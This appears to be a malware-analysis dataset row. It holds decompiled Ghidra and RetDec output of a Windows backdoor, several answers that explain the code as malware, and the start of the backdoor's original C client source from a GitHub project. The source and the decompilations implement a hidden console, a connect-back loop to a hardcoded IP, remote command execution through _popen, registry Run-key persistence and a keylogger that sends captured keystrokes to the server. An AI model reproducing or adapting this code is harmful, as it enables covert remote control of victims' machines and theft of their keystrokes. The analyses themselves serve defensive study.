// WARNING: Could not recover jumptable at 0x00404528. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = ShowWindow(hWnd,nCmdShow);
return BVar1;
}
SHORT _GetKeyState_4(int nVirtKey)
{
SHORT SVar1;
// WARNING: Could not recover jumptable at 0x00404530. Too many branches
// WARNING: Treating indirect jump as call
SVar1 = GetKeyState(nVirtKey);
return SVar1;
}
HWND _FindWindowA_8(LPCSTR lpClassName,LPCSTR lpWindowName)
{
HWND pHVar1;
// WARNING: Could not recover jumptable at 0x00404538. Too many branches
// WARNING: Treating indirect jump as call
pHVar1 = FindWindowA(lpClassName,lpWindowName);
return pHVar1;
}
SIZE_T _VirtualQuery_12(LPCVOID lpAddress,PMEMORY_BASIC_INFORMATION lpBuffer,SIZE_T dwLength)
{
SIZE_T SVar1;
// WARNING: Could not recover jumptable at 0x00404540. Too many branches
// WARNING: Treating indirect jump as call
SVar1 = VirtualQuery(lpAddress,lpBuffer,dwLength);
return SVar1;
}
BOOL _VirtualProtect_16(LPVOID lpAddress,SIZE_T dwSize,DWORD flNewProtect,PDWORD lpflOldProtect)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x00404548. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = VirtualProtect(lpAddress,dwSize,flNewProtect,lpflOldProtect);
return BVar1;
}
LPVOID _TlsGetValue_4(DWORD dwTlsIndex)
{
LPVOID pvVar1;
// WARNING: Could not recover jumptable at 0x00404550. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = TlsGetValue(dwTlsIndex);
return pvVar1;
}
void _Sleep_4(DWORD dwMilliseconds)
{
// WARNING: Could not recover jumptable at 0x00404558. Too many branches
// WARNING: Treating indirect jump as call
Sleep(dwMilliseconds);
return;
}
LPTOP_LEVEL_EXCEPTION_FILTER
_SetUnhandledExceptionFilter_4(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
{
LPTOP_LEVEL_EXCEPTION_FILTER pPVar1;
// WARNING: Could not recover jumptable at 0x00404560. Too many branches
// WARNING: Treating indirect jump as call
pPVar1 = SetUnhandledExceptionFilter(lpTopLevelExceptionFilter);
return pPVar1;
}
HMODULE _LoadLibraryA_4(LPCSTR lpLibFileName)
{
HMODULE pHVar1;
// WARNING: Could not recover jumptable at 0x00404568. Too many branches
// WARNING: Treating indirect jump as call
pHVar1 = LoadLibraryA(lpLibFileName);
return pHVar1;
}
void _LeaveCriticalSection_4(LPCRITICAL_SECTION lpCriticalSection)
{
// WARNING: Could not recover jumptable at 0x00404570. Too many branches
// WARNING: Treating indirect jump as call
LeaveCriticalSection(lpCriticalSection);
return;
}
void _InitializeCriticalSection_4(LPCRITICAL_SECTION lpCriticalSection)
{
// WARNING: Could not recover jumptable at 0x00404578. Too many branches
// WARNING: Treating indirect jump as call
InitializeCriticalSection(lpCriticalSection);
return;
}
void _GetStartupInfoA_4(LPSTARTUPINFOA lpStartupInfo)
{
// WARNING: Could not recover jumptable at 0x00404580. Too many branches
// WARNING: Treating indirect jump as call
GetStartupInfoA(lpStartupInfo);
return;
}
FARPROC _GetProcAddress_8(HMODULE hModule,LPCSTR lpProcName)
{
FARPROC pFVar1;
// WARNING: Could not recover jumptable at 0x00404588. Too many branches
// WARNING: Treating indirect jump as call
pFVar1 = GetProcAddress(hModule,lpProcName);
return pFVar1;
}
HMODULE _GetModuleHandleA_4(LPCSTR lpModuleName)
{
HMODULE pHVar1;
// WARNING: Could not recover jumptable at 0x00404590. Too many branches
// WARNING: Treating indirect jump as call
pHVar1 = GetModuleHandleA(lpModuleName);
return pHVar1;
}
DWORD _GetModuleFileNameA_12(HMODULE hModule,LPSTR lpFilename,DWORD nSize)
{
DWORD DVar1;
// WARNING: Could not recover jumptable at 0x00404598. Too many branches
// WARNING: Treating indirect jump as call
DVar1 = GetModuleFileNameA(hModule,lpFilename,nSize);
return DVar1;
}
DWORD _GetLastError_0(void)
{
DWORD DVar1;
// WARNING: Could not recover jumptable at 0x004045a0. Too many branches
// WARNING: Treating indirect jump as call
DVar1 = GetLastError();
return DVar1;
}
LPSTR _GetCommandLineA_0(void)
{
LPSTR pCVar1;
// WARNING: Could not recover jumptable at 0x004045a8. Too many branches
// WARNING: Treating indirect jump as call
pCVar1 = GetCommandLineA();
return pCVar1;
}
BOOL _FreeLibrary_4(HMODULE hLibModule)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x004045b0. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = FreeLibrary(hLibModule);
return BVar1;
}
BOOL _FindNextFileA_8(HANDLE hFindFile,LPWIN32_FIND_DATAA lpFindFileData)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x004045b8. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = FindNextFileA(hFindFile,lpFindFileData);
return BVar1;
}
HANDLE _FindFirstFileA_8(LPCSTR lpFileName,LPWIN32_FIND_DATAA lpFindFileData)
{
HANDLE pvVar1;
// WARNING: Could not recover jumptable at 0x004045c0. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = FindFirstFileA(lpFileName,lpFindFileData);
return pvVar1;
}
BOOL _FindClose_4(HANDLE hFindFile)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x004045c8. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = FindClose(hFindFile);
return BVar1;
}
void _ExitProcess_4(UINT uExitCode)
{
// WARNING: Could not recover jumptable at 0x004045d0. Too many branches
// WARNING: Subroutine does not return
// WARNING: Treating indirect jump as call
ExitProcess(uExitCode);
return;
}
void _EnterCriticalSection_4(LPCRITICAL_SECTION lpCriticalSection)
{
// WARNING: Could not recover jumptable at 0x004045d8. Too many branches
// WARNING: Treating indirect jump as call
EnterCriticalSection(lpCriticalSection);
return;
}
void _DeleteCriticalSection_4(LPCRITICAL_SECTION lpCriticalSection)
{
// WARNING: Could not recover jumptable at 0x004045e0. Too many branches
// WARNING: Treating indirect jump as call
DeleteCriticalSection(lpCriticalSection);
return;
}
HANDLE _CreateThread_24(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,
LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,
DWORD dwCreationFlags,LPDWORD lpThreadId)
{
HANDLE pvVar1;
// WARNING: Could not recover jumptable at 0x004045e8. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = CreateThread(lpThreadAttributes,dwStackSize,lpStartAddress,lpParameter,dwCreationFlags,
lpThreadId);
return pvVar1;
}
BOOL _AllocConsole_0(void)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x004045f0. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = AllocConsole();
return BVar1;
}
int __cdecl _stricoll(char *_Str1,char *_Str2)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x004045f8. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = _stricoll(_Str1,_Str2);
return iVar1;
}
char * __cdecl _strdup(char *_Src)
{
char *pcVar1;
// WARNING: Could not recover jumptable at 0x00404600. Too many branches
// WARNING: Treating indirect jump as call
pcVar1 = _strdup(_Src);
return pcVar1;
}
int __cdecl _text_startup(int _Argc,char **_Argv,char **_Env)
{
byte bVar1;
byte *pbVar2;
int iVar3;
byte *pbVar4;
_STARTUPINFOA local_64;
int *local_14;
local_14 = &_Argc;
___main();
pbVar2 = (byte *)_GetCommandLineA_0();
_GetStartupInfoA_4(&local_64);
if (pbVar2 != (byte *)0x0) {
for (; (bVar1 = *pbVar2, bVar1 == 0x20 || (bVar1 == 9)); pbVar2 = pbVar2 + 1) {
}
if (bVar1 == 0x22) {
do {
pbVar4 = pbVar2;
pbVar2 = pbVar4 + 1;
bVar1 = *pbVar2;
if (bVar1 == 0x22) break;
} while (bVar1 != 0);
if (bVar1 == 0x22) {
pbVar2 = pbVar4 + 2;
}
}
else {
for (; ((*pbVar2 & 0xdf) != 0 && (*pbVar2 != 9)); pbVar2 = pbVar2 + 1) {
}
}
for (; (*pbVar2 == 0x20 || (*pbVar2 == 9)); pbVar2 = pbVar2 + 1) {
}
}
_GetModuleHandleA_4((LPCSTR)0x0);
iVar3 = _WinMain_16();
return iVar3;
}","//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com/
//
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <windows.h>
// ------------------------ Structures ------------------------
struct WSAData {
int16_t e0;
int16_t e1;
int16_t e2;
int16_t e3;
char * e4;
char e5[1];
char e6[1];
};
struct _IO_FILE {
int32_t e0;
};
struct _SECURITY_ATTRIBUTES {
int32_t e0;
int32_t * e1;
bool e2;
};
struct _STARTUPINFOA {
int32_t e0;
char * e1;
char * e2;
char * e3;
int32_t e4;
int32_t e5;
int32_t e6;
int32_t e7;
int32_t e8;
int32_t e9;
int32_t e10;
int32_t e11;
int16_t e12;
int16_t e13;
char * e14;
int32_t * e15;
int32_t * e16;
int32_t * e17;
};
struct sockaddr {
int16_t e0;
char e1[14];
};
// ------------------- Function Prototypes --------------------
int32_t ___chkstk_ms(void);
int32_t ___do_global_ctors(void);
int32_t ___main(void);
int32_t _bootRun(void);
int32_t _Shell(void);
int32_t _str_cut(int32_t a1, int32_t a2, int32_t a3);
int32_t _WinMain_40_16(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
// --------------------- Global Variables ---------------------
int32_t g1 = -1; // 0x4046f0
int32_t g2 = 0x6f430072; // 0x406139
int32_t g3 = 0; // 0x408028
int32_t g4 = 0; // 0x408070
int32_t g5;
// ------- Dynamically Linked Functions Without Header --------
int32_t _chdir(char * a1);
struct _IO_FILE * _popen(char * a1, char * a2);
// ------------------------ Functions -------------------------
// Address range: 0x401460 - 0x401561
int32_t _str_cut(int32_t a1, int32_t a2, int32_t a3) {
char * str = (char *)a1; // 0x401469
if (*str == 0) {
// 0x40155f
return 0;
}
int32_t v1; // 0x401460
int32_t v2; // 0x401460
if (a3 < 0 == a3 < a2) {
uint32_t len = strlen(str); // 0x40148e
if (len - 1 < -a3) {
// 0x40155f
return 0;
}
int32_t v3 = (a2 < 0 ? -a2 : a2) > len ? -len : a2;
v2 = v3;
v1 = v3 + len;
} else {
// 0x4014e5
if (a2 > -1 != a3 > a2) {
// 0x40155f
return 0;
}
// 0x4014f3
v2 = a2;
v1 = a2;
if (strlen(str) - 1 < a2) {
// 0x40155f
return 0;
}
}
int32_t nmemb = a3 - v2;
int32_t * mem = calloc(nmemb, 1); // 0x40153b
strncpy((char *)mem, (char *)(v1 + a1), nmemb);
// 0x40155f
return (int32_t)mem;
}
// Address range: 0x401561 - 0x40176b
int32_t _bootRun(void) {
int32_t buf = 0x6c696166; // bp-148, 0x40156c
int32_t v1; // bp-140, 0x401561
__asm_rep_stosd_memset((char *)&v1, 0, 30);
int32_t buf2; // bp-276, 0x401561
__asm_rep_movsd_memcpy((char *)&buf2, ""Created Pesistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"", 22);
int32_t v2; // bp-184, 0x401561
__asm_rep_stosd_memset((char *)&v2, 0, 9);
int32_t lpFilename; // bp-536, 0x401561
int32_t nameSize = GetModuleFileNameA(NULL, (char *)&lpFilename, 260); // 0x4015f8
if (nameSize == 0) {
// 0x401609
send(g4, (char *)&buf, 128, 0);
// 0x401764
return -1;
}
// 0x40163f
int32_t phkResult; // bp-540, 0x401561
int32_t v3 = RegOpenKeyA((int32_t *)-0x7fffffff, ""Software\\Microsoft\\Windows\\CurrentVersion\\Run"", (int32_t **)&phkResult); // 0x401658
if (v3 != 0) {
// 0x401664
send(g4, (char *)&buf, 128, 0);
// 0x401764
return -1;
}
int32_t v4 = RegSetValueExA((int32_t *)phkResult, ""Hacked"", 0, 1, (char *)&lpFilename, nameSize); // 0x4016d2
RegCloseKey((int32_t *)phkResult);
int32_t result; // 0x401561
if (v4 == 0) {
// 0x401722
send(g4, (char *)&buf2, 128, 0);
result = 0;
} else {
// 0x4016de
send(g4, (char *)&buf, 128, 0);
result = -1;
}
// 0x401764
return result;
}
// Address range: 0x401ad1 - 0x401d06
int32_t _Shell(void) {
int32_t v1 = ___chkstk_ms(); // 0x401ad9
int32_t v2; // bp-1044, 0x401ad1
int32_t v3 = &v2; // 0x401af6
int32_t v4; // bp-2068, 0x401ad1
int32_t v5 = &v4;
int32_t v6; // bp-20452, 0x401ad1
int32_t v7 = &v6;
int32_t v8; // bp-4, 0x401ad1
int32_t v9 = (int32_t)&v8 - v1;
int32_t * v10 = (int32_t *)(v9 + 8); // 0x401ae0
*v10 = 1024;
int32_t * v11 = (int32_t *)(v9 + 4); // 0x401ae8
*v11 = 0;
int32_t * v12 = (int32_t *)v9; // 0x401af6
*v12 = v3;
memset(&g5, (int32_t)&g5, (int32_t)&g5);
*v10 = 1024;
*v11 = 0;
*v12 = v5;
memset(&g5, (int32_t)&g5, (int32_t)&g5);
*v10 = 0x47d0;
*v11 = 0;
*v12 = v7;
memset(&g5, (int32_t)&g5, (int32_t)&g5);
*(int32_t *)(v9 + 12) = 0;
*v10 = 1024;
*v11 = v3;
*v12 = g4;
recv((int32_t)&g5, (char *)&g5, (int32_t)&g5, (int32_t)&g5);
int32_t v13 = v9 - 16; // 0x401b63
while ((char)v2 != 113) {
int32_t * v14 = (int32_t *)(v9 - 8); // 0x401b9c
*v14 = 3;
int32_t * v15 = (int32_t *)(v9 - 12); // 0x401baa
*v15 = v3;
int32_t * v16 = (int32_t *)v13; // 0x401bae
*v16 = (int32_t)""cd "";
int32_t v17; // 0x401ad1
if (strncmp((char *)&g5, (char *)&g5, (int32_t)&g5) != 0) {
// 0x401be9
*v14 = 7;
*v15 = v3;
*v16 = (int32_t)""persist"";
if (strncmp((char *)&g5, (char *)&g5, (int32_t)&g5) != 0) {
// 0x401c15
*v14 = 12;
*v15 = v3;
*v16 = (int32_t)""keylog_start"";
if (strncmp((char *)&g5, (char *)&g5, (int32_t)&g5) != 0) {
// 0x401c76
*v15 = (int32_t)&g2;
*v16 = v3;
int32_t v18 = (int32_t)_popen((char *)&g5, (char *)&g5); // 0x401c87
*v14 = v18;
*v15 = 1024;
*v16 = v5;
if (fgets((char *)&g5, (int32_t)&g5, (struct _IO_FILE *)&g5) != NULL) {
*v15 = v5;
*v16 = v7;
strcat((char *)&g5, (char *)&g5);
*v14 = v18;
*v15 = 1024;
*v16 = v5;
while (fgets((char *)&g5, (int32_t)&g5, (struct _IO_FILE *)&g5) != NULL) {
// 0x401c91
*v15 = v5;
*v16 = v7;
strcat((char *)&g5, (char *)&g5);
*v14 = v18;
*v15 = 1024;
*v16 = v5;
}
}
// 0x401cca
*(int32_t *)(v9 - 4) = 0;
*v14 = 0x47d0;
*v15 = v7;
*v16 = g4;
send((int32_t)&g5, (char *)&g5, (int32_t)&g5, (int32_t)&g5);
int32_t v19 = v9 - 32; // 0x401cf3
*(int32_t *)v19 = v18;
fclose((struct _IO_FILE *)&g5);
v17 = v19;
} else {
// 0x401c37
*v11 = 0;
*v12 = 0;
*(int32_t *)(v9 - 4) = 0;
*v14 = 0x40176b;
*v15 = 0;
*v16 = 0;
CreateThread((struct _SECURITY_ATTRIBUTES )&g5, (int32_t)&g5, (int32_t ()(int32_t *))&g5, &g5, (int32_t)&g5, &g5);
v17 = v9 - 40;
}
} else {
// 0x401c0b
_bootRun();
v17 = v13;
}
} else {
// 0x401bbe
*v14 = 100;
*v15 = 3;
*v16 = v3;
int32_t v20 = _str_cut((int32_t)&g5, (int32_t)&g5, (int32_t)&g5); // 0x401bd7
*v16 = v20;
_chdir((char *)&g5);
v17 = v13;
}
v9 = v17;
v10 = (int32_t *)(v9 + 8);
*v10 = 1024;
v11 = (int32_t *)(v9 + 4);
*v11 = 0;
v12 = (int32_t *)v9;
*v12 = v3;
memset(&g5, (int32_t)&g5, (int32_t)&g5);
*v10 = 1024;
*v11 = 0;
*v12 = v5;
memset(&g5, (int32_t)&g5, (int32_t)&g5);
*v10 = 0x47d0;
*v11 = 0;
*v12 = v7;
memset(&g5, (int32_t)&g5, (int32_t)&g5);
*(int32_t *)(v9 + 12) = 0;
*v10 = 1024;
*v11 = v3;
*v12 = g4;
recv((int32_t)&g5, (char *)&g5, (int32_t)&g5, (int32_t)&g5);
v13 = v9 - 16;
}
// 0x401b7b
*(int32_t *)v13 = g4;
closesocket((int32_t)&g5);
WSACleanup();
*(int32_t *)(v9 - 20) = 0;
exit((int32_t)&g5);
// UNREACHABLE
}
// Address range: 0x401d06 - 0x401e1f
int32_t _WinMain_40_16(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
// 0x401d06
AllocConsole();
ShowWindow(FindWindowA(""ConsoleWindowClass"", NULL), 0);
int32_t v1; // bp-440, 0x401d06
if (WSAStartup(2, (struct WSAData *)&v1) != 0) {
// 0x401d6e
exit(1);
// UNREACHABLE
}
// 0x401d7a
g4 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
int32_t v2; // bp-40, 0x401d06
memset(&v2, 0, 16);
v2 = 2;
inet_addr(""192.168.100.1"");
htons(-0x3cab);
int32_t v3; // bp-504, 0x401d06
int32_t v4 = &v3; // 0x401ddc
*(int32_t *)(v4 + 8) = 16;
int32_t v5 = &v2; // 0x401df6
*(int32_t *)(v4 + 4) = v5;
v3 = g4;
if (connect((int32_t)&g5, (struct sockaddr *)&g5, (int32_t)&g5) == 0) {
// 0x401e1a
_Shell();
// UNREACHABLE
}
int32_t * v6 = (int32_t *)(v4 - 12);
*v6 = 10;
Sleep((int32_t)&g5);
int32_t v7 = v4 - 16; // 0x401e15
*(int32_t *)(v4 - 8) = 16;
*v6 = v5;
*(int32_t *)v7 = g4;
while (connect((int32_t)&g5, (struct sockaddr *)&g5, (int32_t)&g5) != 0) {
int32_t v8 = v7;
v6 = (int32_t *)(v8 - 12);
*v6 = 10;
Sleep((int32_t)&g5);
v7 = v8 - 16;
*(int32_t *)(v8 - 8) = 16;
*v6 = v5;
(int32_t )v7 = g4;
}
// 0x401e1a
_Shell();
// UNREACHABLE
}
// Address range: 0x402350 - 0x402396
int32_t ___do_global_ctors(void) {
int32_t v1 = 0;
int32_t v2 = v1 + 1; // 0x402386
while ((int32_t )(4 * v2 + (int32_t)&g1) != 0) {
// 0x402386
v1 = v2;
v2 = v1 + 1;
}
// 0x402394
if (v1 == 0) {
// 0x40236f
return atexit((void ()())0x402320);
}
int32_t v3 = v1; // 0x402361
while (v3 != 1) {
// 0x402363
v3--;
}
// 0x40236f
return atexit((void ()())0x402320);
}
// Address range: 0x4023a0 - 0x4023bc
int32_t ___main(void) {
int32_t result = g3; // 0x4023a0
if (result != 0) {
// 0x4023a9
return result;
}
// 0x4023b0
g3 = 1;
return ___do_global_ctors();
}
// Address range: 0x4029f0 - 0x402a1a
int32_t ___chkstk_ms(void) {
// 0x4029f0
int32_t result; // 0x4029f0
return result;
}
// Address range: 0x404610 - 0x4046db
int main(int argc, char ** argv) {
// 0x404610
___main();
char * commandLine = GetCommandLineA(); // 0x404628
int32_t v1 = (int32_t)commandLine; // 0x404628
int32_t lpStartupInfo; // bp-100, 0x404610
GetStartupInfoA((struct _STARTUPINFOA *)&lpStartupInfo);
int32_t v2 = v1; // 0x40463f
int32_t v3 = v1; // 0x40463f
int32_t v4; // 0x404610
int32_t * moduleHandle; // 0x404694
if (commandLine == NULL) {
lab_0x40467e:;
// 0x40467e
int16_t v5; // 0x404610
char v6; // 0x404610
v4 = v6 % 2 == 0 ? 10 : (int32_t)(uint16_t)v5;
moduleHandle = GetModuleHandleA(NULL);
return _WinMain_40_16((int32_t)moduleHandle, 0, v3, v4);
}
int32_t v7; // 0x404610
char v8; // 0x404646
while (true) {
lab_0x404646:
// 0x404646
v7 = v2;
v8 = *(char *)v7;
switch (v8) {
case 32: {
// 0x404643
v2 = v7 + 1;
goto lab_0x404646;
}
case 9: {
// 0x404643
v2 = v7 + 1;
goto lab_0x404646;
}
default: {
goto lab_0x404651;
}
}
}
lab_0x404651:;
char v9 = v8; // 0x404653
int32_t v10 = v7; // 0x404653
int32_t v11 = v7; // 0x404653
int32_t v12; // 0x404610
if (v8 != 34) {
while (true) {
lab_0x404667:
// 0x404667
v12 = v10;
switch (v9) {
case 32: {
goto lab_0x404673_2;
}
case 9: {
goto lab_0x404673_2;
}
case 0: {
goto lab_0x404673_2;
}
default: {
int32_t v13 = v10 + 1; // 0x404664
v9 = *(char *)v13;
v10 = v13;
goto lab_0x404667;
}
}
}
} else {
int32_t v14; // 0x404610
int32_t v15; // 0x4046c8
char v16; // 0x4046cb
while (true) {
lab_0x4046c6:
// 0x4046c6
v14 = v11;
v15 = v14 + 1;
v16 = *(char )v15;
v11 = v15;
switch (v16) {
case 34: {
goto lab_0x4046d2;
}
case 0: {
goto lab_0x4046d2;
}
default: {
goto lab_0x4046c6;
}
}
}
lab_0x4046d2:
// 0x4046d2
v12 = v16 != 34 ? v15 : v14 + 2;
}
lab_0x404673_2:;
int32_t v17 = v12; // 0x404610
while (true) {
lab_0x404673:;
int32_t v18 = v17;
v3 = v18;
switch ((char *)v18) {
case 32: {
// 0x404670
v17 = v18 + 1;
goto lab_0x404673;
}
case 9: {
// 0x404670
v17 = v18 + 1;
goto lab_0x404673;
}
default: {
goto lab_0x40467e;
}
}
}
int32_t v19 = v3;
uint16_t v20; // 0x404610
unsigned char v21; // 0x404610
v4 = v21 % 2 == 0 ? 10 : (int32_t)v20;
moduleHandle = GetModuleHandleA(NULL);
return _WinMain_40_16((int32_t)moduleHandle, 0, v19, v4);
}
// --------------------- Meta-Information ---------------------
// Detected compiler/packer: gcc (6.3.0)
// Detected functions: 8","1. The primary functionality of the code appears to be to act as a background service or a backdoor on a Windows system. It includes capabilities for persistence, keylogging, remote command execution, and connecting back to a server controlled by an attacker.

2. Three key functions:
   - `logg()`: This function acts as a keylogger, recording keystrokes and saving them to a file named ""windows.txt"".
   - `bootRun()`: This function sets up persistence by adding a registry key to ensure the malware starts up with Windows.
   - `Shell()`: This function waits for commands from a remote server to execute on the infected machine, enabling remote control.

3. The `sock` variable refers to a socket file descriptor that the code uses for network communication, particularly for sending data to and receiving commands from a remote server.

4. Error handling is done primarily through checking function return values. If a function fails (e.g., `RegOpenKey`, `connect`), the code usually sends an error message to the server and either exits or continues to attempt the operation.

5. Flow of execution in `WinMain`:
   - The console window is hidden.
   - Windows socket is initialized.
   - A TCP socket is created.
   - A loop attempts to connect to the remote server.
   - Upon successful connection, the `Shell` function is called to interpret and execute remote commands.

6. External libraries or dependencies:
   - `<WinSock2.h>`: For network communication.
   - `<Windows.h>`, `<WinUser.h>`: For Windows API functions and types.
   - `<WinInet.h>`: For Internet-related operations.
   - `<windowsx.h>`: For message-cracking macros.
   - `<string.h>`, `<sys/stat.h>`, `<sys/types.h>`, `<direct.h>`: For string manipulation and directory/file operations.

7. Security concerns:
   - The keylogger functionality is a privacy invasion.
   - The program persists itself, hinting at malware characteristics.
   - There's remote execution of potentially malicious commands.
   - It lacks proper authorization and encryption, posing a man-in-the-middle attack risk.
   - The abuse of syscalls, such as registry manipulation, may bypass standard security controls.","1. The primary functionality of this code appears to be the initialization and execution of a Windows application. It sets up exception handling, initializes CPU features, processes command-line arguments, and creates threads for keylogging and persistence functionalities. It also performs directory operations and window management.

2. Three key functions:
   - `_mainCRTStartup`: This is the entry point function for the application, responsible for performing initializations before calling the main application function.
   - `_WinMain_16`: A variant of the typical `WinMain` function used in GUI applications on Windows, which performs window management and initialization of the application.
   - `_bootRun`: Appears to modify the Windows registry to ensure the app runs on startup, likely implementing persistence for the application.

3. Variable `local_24` in `___mingw_glob`: This local variable seems to be used as a return value holder for the function `___mingw_glob`, which performs pattern matching on file names (globbing). Its value determines the success or failure of the globbing operation.

4. The error handling mechanism mostly relies on setting the appropriate error code in the C runtime error variable (via calls to `__errno`) or retrieving the last error code from the Windows API (`_GetLastError_0`). The code checks the success of API functions and branches to handle errors, often terminating the operation or setting a specific return value.

5. Flow of execution in `_mainCRTStartup`:
   - Initializes the application type.
   - Calls `FUN_004011b0` to perform various initialization tasks.
   - Repeats initialization with a different application type.
   - Attempts to register for exit functions using `atexit`.
   - If exit functions are registered, it calls them upon exit.

6. External libraries or dependencies:
   - Standard C library functions (e.g., `malloc`, `free`, `strlen`).
   - Windows API functions for system and file operations (e.g., `GetModuleHandleA`, `VirtualQuery`, `FindFirstFileA`).
   - C Run-Time Library functions for locale and multibyte character set operations (e.g., `_setlocale`, `_mbstowcs`).

7. Evident security concerns:
   - The use of functions like `strcpy`, `strcat` without bounds checking could lead to buffer overflows.
   - Manipulating the Windows registry for persistence might be indicative of malware behavior.
   - The program may perform operations that require elevated privileges, possibly leading to security vulnerabilities if not managed correctly.
   - The handling of a top-level exception filter (`_SetUnhandledExceptionFilter_4`) without proper context could be a vector for exploitation.","1. The code appears to be part of a malware program designed to connect to a remote server, execute commands received from it, create persistence in the registry, manage connections, and possibly log keystrokes.

2. Key functions:
   - `_Shell`: Listens for commands from a remote server, executes them, and sends back the output.
   - `_bootRun`: Adds a registry entry for persistence, to run the malware on system startup.
   - `_WinMain_40_16`: Sets up the application, initializes Winsock, creates a socket, and attempts to connect to a remote server in a loop until successful.

3. `g4`: This global variable is used as the socket file descriptor for network communication. It is initialized in `_WinMain_40_16` and used across various network operations like `send` and `recv`.

4. Error handling is mostly done using return values from functions. For example, in `_bootRun` and `_WinMain_40_16`, if a critical function fails (like `WSAStartup` or `connect`), the program exits or continues to attempt the connection.

5. In `_Shell`, a buffer is repeatedly filled with commands received from a remote server. These commands are processed in a loop that only stops when the character 'q' is received. Each command is executed with `_popen`, and the result is sent back to the server.

6. External libraries:
   - Winsock library (`winsock2.h`): For network communication.
   - Windows API (`windows.h`): For Windows-specific operations like creating processes and manipulating the registry.
   - C standard library: For memory allocation, string handling, etc.

7. Security concerns:
   - Hardcoded IP address and port may indicate a command-and-control (C2) server.
   - Registry manipulation for persistence can be considered malicious.
   - Lack of encryption for network communication reveals a potential attack vector for man-in-the-middle (MitM) attacks.
   - The presence of a potential keylogging function suggests it might capture sensitive information.
   - Functions like `___chkstk_ms`, while normally used to prevent stack overflows, could be abused to bypass security mechanisms."
3,https://github.com/ValorousKarma/RubberRoom/tree/main/src-client,Done,Windows,"#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <wininet.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include ""UseTracker.h""
extern PSTR pTempBuff;
extern HANDLE notWritingTemp;
extern HANDLE notSendingLog;
extern int tempBuffHasData;
/*
* NOTE
* This code will be EXTENSIVELY commented
* I have never done socket programming before, and will write out
* what each line does for personal reference
/
#define bzero(p, size) (void) memset((p), '\0', (size)); // because memset will be used many times
int sock;
/
int run_it_up()
{
char err[128] = ""Failed\n"";
char suc[128] = ""Enabled startup boot: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurentVersion\\Run\n"";
TCHAR szPath[MAX_PATH];
DWORD pathLen = 0;
pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
if (pathLen == 0)
{
send(sock, err, sizeof(err), 0);
return(-1);
}
HKEY NewVal;
if (RegOpenKey(HKEY_CURRENT_USER, TEXT(""Software\\Microsoft\\Windows\\CurrentVersion\\Run""), &NewVal) != ERROR_SUCCESS)
{
send(sock, err, sizeof(err), 0);
return(-1);
}
DWORD pathLenInBytes = pathLen * sizeof(*szPath);
if (RegSetValueEx(NewVal, TEXT(""RemoteConsole""), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
{
RegCloseKey(NewVal);
send(sock, err, sizeof(err), 0);
return(-1);
}
RegCloseKey(NewVal);
return(0);
}
/
/ SHELL FUNCTION
* Is called by main function after socket connection established
* loops infinitely, receiving commands, doing something with them, and sending responses, until quit command
/
void oh_boy_what_does_this_do()
{
char buffer[1024];
char container[1024];
char total_response[18384];
while(1)
{
bzero(buffer, sizeof(buffer));
bzero(container, sizeof(container));
bzero(total_response, sizeof(total_response));
recv(sock, buffer, sizeof(buffer), 0); // receives command from server and stores in buffer
// QUIT command
if (strncmp(""quit"", buffer, 4) == 0)
{
closesocket(sock); // closes opened socket
WSACleanup(); // performs windows cleanup
exit(0); // end program
}
// CHANGE DIRECTORY command
else if (strncmp(""cd "", buffer, 3) == 0) // handle change directory commands differently
{
chdir(buffer + 3);
send(sock, total_response, sizeof(total_response), 0);
} /
else if (strncmp(""the_creator"", buffer, 7) == 0)
{
if (run_it_up() == -1)
{
strncpy(total_response, ""Error"", sizeof(total_response));
}
else
{
strncpy(total_response, ""Success!"", sizeof(total_response));
}
send(sock, total_response, sizeof(total_response), 0);
} */
// START KEYLOGGER command
else if (strncmp(""make_me_crazy"", buffer, 12) == 0)
{
// send Failed if error returned by keylogger function, Sucess if not
if (make_me_crazy() != 0)
{
strncpy(total_response, ""Failed\n"", 7);
}
else
{
strncpy(total_response, ""Success\n"", 8);
}
send(sock, total_response, sizeof(total_response), 0);
}
// GET KEYLOG command
else if (strncmp(""with_rats"", buffer, 9) == 0)
{
// if new key inputs, send buffer and change event states, if none, say that
ResetEvent(notSendingLog);
if (tempBuffHasData)
{
// if temp buffer is being written to, wait
WaitForSingleObject(notWritingTemp, INFINITE);
// copy buffer, format, send
strncpy(total_response, ""KLG: "", 5);
strncpy(total_response + 5, pTempBuff, strlen(pTempBuff));
strncpy(total_response + 5 + strlen(pTempBuff), ""\n"", 1);
send(sock, total_response, sizeof(total_response), 0);
// clear temporary buffer
ZeroMemory(pTempBuff, strlen(pTempBuff));
tempBuffHasData = 0;
}
else
{
strncpy(total_response, ""[NO NEW DATA]\n"", 14);
send(sock, total_response, sizeof(total_response), 0);
}
